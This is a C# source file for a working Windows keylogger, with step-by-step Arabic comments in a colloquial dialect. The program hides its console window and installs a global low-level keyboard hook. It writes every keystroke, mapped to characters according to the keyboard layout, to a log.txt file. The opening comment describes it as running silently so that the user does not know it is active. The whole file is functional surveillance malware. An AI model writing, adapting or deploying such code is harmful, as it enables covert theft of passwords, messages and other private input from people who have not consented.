using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Globalization;
using KeystrokeMonitor;

namespace WindowsAppKeylogger
{

    /*البرنامج هاظ بشتغل ورا الكواليس، يعني ما بفتحلك شاشة ولا بيبين للمستخدم إنه شغّال.

وظيفته يراقب كل كبسة بتصير عالكيبورد، يعني إذا كبست أي زر، البرنامج بلقطها.

ومن بعدها، إنت بتقدر تبرمج يعمل إشي معيّن لما المستخدم يكبس زر معيّن، زي يطبع إشي، يسجّل الكبسة، أو يمنعها.

وبضل البرنامج شغّال بهدوء هيك، لحد ما يتسكر، كأنه واقف براقب الكيبورد على الساكت.*/

    public class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        public void Run()
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        /*دالة Close() بسكّر البرنامج بشكل مرتب.

دالة SetHook() بتحط "مراقِب" على الكيبورد عشان البرنامج يقدر يعرف متى المستخدم يكبس أي زر.

بجيب معلومات عن البرنامج الحالي وبمررها لنظام التشغيل عشان يشتغل الـ hook بشكل سليم.*/

        public void Close() { Application.Exit(); Application.ExitThread(); }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            // عشان نجيب معلومات عن البرنامج الحالي اللي شغال  Process.GetCurrentProcess() هون منستخدم


            using (ProcessModule curModule = curProcess.MainModule)
            // بتعطينا معلومات عن الملف التنفيذي (exe) الخاص بالبرنامج.curProcess.MainModule بعدها 
            //ليش منحتاج هاي المعلومات؟ عشان نمرر اسم الملف التنفيذي لما نركّب الـ hook، وهذا بساعد نظام Windows يعرف وين يربط الـ hook. 
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                //WH_KEYBOARD_LL: نوع الـ hook، يعني "لوحة مفاتيح منخفض المستوى".
                //proc: الدالة (callback) اللي بدنا نظام Windows يستدعيها كل مرة المستخدم يكبس فيها زر
                //GetModuleHandle(...): منمررله اسم الملف التنفيذي عشان يعرف من وين يستدعي الـ callback.
                //0: معناها إنه بدنا نركّب الـ hook على كل العمليات (global hook).
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);
        /*هذا السطر من الكود يعرف "delegate"، وهو ببساطة نوع دالة. في هذا السياق، هذا الـ delegate يُستخدم لتحديد شكل الدالة (callback) التي راح يتم استدعاؤها كل مرة المستخدم يضغط فيها زر على الكيبورد.
*/
        /*int nCode:
🔸 رقم بيوضح نوع الحدث — إذا كان nCode >= 0، معناها إنه الكيبورد أرسل حدث مهم (زي كبسة زر) ويجب معالجته.

2. IntPtr wParam:
🔸 يحتوي على نوع الرسالة (زي WM_KEYDOWN أو WM_KEYUP) — يعني هل المفتاح نضغط ولا نرفع؟

3. IntPtr lParam:
🔸 هذا مؤشر على معلومات إضافية عن الحدث، مثل رقم الزر*/
        /*هاظ السطر بيعرّف نوع خاص من الدوال، وظيفته إنه كل ما حدا يكبس زر على الكيبورد، النظام يستدعي دالة معينة شكلها معروف مسبقًا (بترجع IntPtr وبتستقبل 3 معاملات).

إنت لاحقًا بتكتب هاي الدالة، وبتقول للنظام: "كل ما يصير حدث، ناديني عهالدالة".*/

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        //تسجّل المفاتيح التي يتم الضغط عليها في ملف نصي log.txt داخل مجلد البرنامج.
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                try
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    //Marshal.ReadInt32(lParam) → يقرأ كود الزر (virtual key code) من lParam.
                    StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                    /*يفتح ملف log.txt الموجود في نفس مجلد تشغيل البرنامج.

true تعني: اكتب في آخر الملف (لا تمسح المحتوى القديم)*/

                    if (vkCode >= 65 && vkCode <= 90)
                        sw.Write((Keys)vkCode);
                    else if (vkCode == (int)Keys.Enter)
                        sw.Write("\n");
                    else if (vkCode == (int)Keys.Space)
                        sw.Write(" ");
                    else
                        sw.Write(KeyCodeToUnicode((Keys)vkCode));

                    sw.Close();
                }
                catch { }
            }//بمسك اي خطأ ممكن يحدث 

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
            //بتخلي باقي البرامج اللي فيها هوك تظل شغالة و ما توقف و انا بستخدم هاظ البرنامج
        }


        //هون وظيفته انه يحول ال keycode الى الحرف الفعلي 
        public static string KeyCodeToUnicode(Keys key)
        {
            byte[] keyboardState = new byte[255];
            //بسوي ماتريكس من 255 زر
            bool keyboardStateStatus = GetKeyboardState(keyboardState);
            //بتعطيني حالة الكيبورد اذا كان الي مستخدم حرف كابيتال او سمول او بكتب عربي 
            if (!keyboardStateStatus)
            {
                return "";
            }
            //اذا ما قدر يقرأ حالة الكيبورد برجعها فاضية 

            uint virtualKeyCode = (uint)key;
            //بحول الزر الى الرقم الفعلي الخاص به
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);
            //بحول الرقم الفعلي الى الموقع الخاص بالزر على الكيبورد
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);
            //بجيب لغة الكيبورد الحالية 
            StringBuilder result = new StringBuilder();
            //بخزن الحرف النهائي بمتغير اسمه result
            ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);
            //بتحوّل كل المعلومات السابقة إلى الحرف الحقيقي اللي المفروض ينكتب.

            return result.ToString();
            //هون بترجع الحرف الي خزنته بال result
        }

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}


